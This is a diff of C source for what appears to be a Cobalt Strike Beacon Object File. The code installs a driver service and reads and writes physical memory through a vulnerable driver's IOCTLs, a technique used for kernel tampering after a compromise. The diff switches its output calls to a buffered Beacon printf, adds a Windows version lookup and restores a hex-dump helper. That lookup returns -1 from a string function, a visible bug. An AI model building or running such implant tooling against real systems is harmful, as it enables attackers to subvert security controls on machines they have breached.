@@ -8,7 +8,7 @@ BOOL isServiceInstalled()
     SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCManager == NULL)
     {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to open SCM!");
+        BeaconFormatPrintf(&outputbuffer, "Failed to open SCM!\n");
         return FALSE;
     }
 
@@ -21,18 +21,18 @@ BOOL isServiceInstalled()
             hServiceObject = NULL; // TODO: Remove after upload functionality is implemented
             if (hServiceObject == NULL)
             {
-                BeaconPrintf(CALLBACK_ERROR, "Failed to create driver service! 0x%llx", GetLastError());
+                BeaconFormatPrintf(&outputbuffer, "Failed to create driver service! 0x%llx\n", GetLastError());
                 return FALSE;
             }
             else
             {
-                BeaconPrintf(CALLBACK_OUTPUT, "Created driver service!");
+                BeaconFormatPrintf(&outputbuffer, "Created driver service!\n");
                 return TRUE;
             }
         }
         else
         {
-            BeaconPrintf(CALLBACK_ERROR, "Failed to open service object!");
+            BeaconFormatPrintf(&outputbuffer, "Failed to open service object!\n");
             return FALSE;
         }
     }
@@ -61,11 +61,24 @@ char* GetWinBuildNumber()
 
     if (st != ERROR_SUCCESS) 
     {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to get Windows build number (err=%ld)\n", st);
+        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows build number (err=%ld)\n", st);
         return NULL;
     }
 
     return g_BuildStr;
+}
+
+char* GetWinVersion()
+{
+    static char pvWindowsVersion[32] = { 0 };
+    DWORD cbData = 32;
+    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_REG_SZ, NULL, pvWindowsVersion, &cbData) != ERROR_SUCCESS)
+    {
+        BeaconFormatPrintf(&outputbuffer, "Failed to get Windows version!\n");
+        return -1;
+    }
+
+    return pvWindowsVersion;
 }
 
 BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
@@ -94,7 +107,7 @@ BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
         NULL);
 
     if (!result) {
-        BeaconPrintf(CALLBACK_OUTPUT, "DeviceIoControl failed: %lu\n", GetLastError());
+        BeaconFormatPrintf(&outputbuffer, "DeviceIoControl failed: %lu\n", GetLastError());
         return FALSE;
     }
 
@@ -120,7 +133,7 @@ BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue)
 
     BOOL result = DeviceIoControl(hFile, TPWSAV_READ_IOCTL, &request, sizeof(request), &request, sizeof(request), &bytesReturned, NULL);
     if (!result) {
-        BeaconPrintf(CALLBACK_OUTPUT, "DeviceIoControl failed: %lu\n", GetLastError());
+        BeaconFormatPrintf(&outputbuffer, "DeviceIoControl failed: %lu\n", GetLastError());
         return FALSE;
     }
 
@@ -254,16 +267,19 @@ wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStruct
     return UnicodeString;
 }
 
-// BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize)
-// {
-//     for (int i = 0; i < ByteArraySize; i++)
-//     {
-//         printf("%02x", ByteArray[i]);
-//     }
-//     printf("\n");
 
-//     return TRUE;
-// }
+BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize)
+{    
+    for (int i = 0; i < ByteArraySize; i++)
+    {
+        // printf("%02x", (unsigned char*)ByteArray[i]);
+        BeaconFormatPrintf(&outputbuffer, "%02x", (unsigned char*)ByteArray[i]);
+    }
+    BeaconFormatPrintf(&outputbuffer, "\n");
+
+    return TRUE;
+}
+
 
 DWORD SearchPattern(unsigned char* mem, DWORD NumOfBytesToSearch, unsigned char* signature, DWORD signatureLen)
 {
